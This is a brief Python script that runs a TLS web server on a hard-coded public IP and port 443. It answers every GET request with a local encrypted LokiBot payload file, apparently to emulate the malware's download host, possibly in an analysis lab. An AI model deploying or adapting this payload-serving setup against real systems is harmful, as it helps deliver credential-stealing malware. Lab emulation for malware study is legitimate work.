import http.server, ssl, os
from http.server import HTTPServer, BaseHTTPRequestHandler

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "application/octet-stream")
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        body = b''
        with open('C:\\Users\\INFERNO\\Desktop\\www\\web\\encrypted_lokibot_downloaded_googledrive.bin', "rb") as f:
            body = f.read()
        self.wfile.write(body)

web_dir = os.path.join(os.path.dirname(__file__), 'web')
os.chdir(web_dir)

server_address = ('63.141.228.141', 443)
httpd = http.server.HTTPServer(server_address,S)
httpd.socket = ssl.wrap_socket(
    httpd.socket,
    server_side=True,
    certfile='C:\\Users\\INFERNO\\Desktop\\www\\cert.pem',
    ssl_version=ssl.PROTOCOL_TLSv1_2,
    ciphers='RSA+AESGCM:RSA+AES:RSA+HIGH')

httpd.serve_forever()
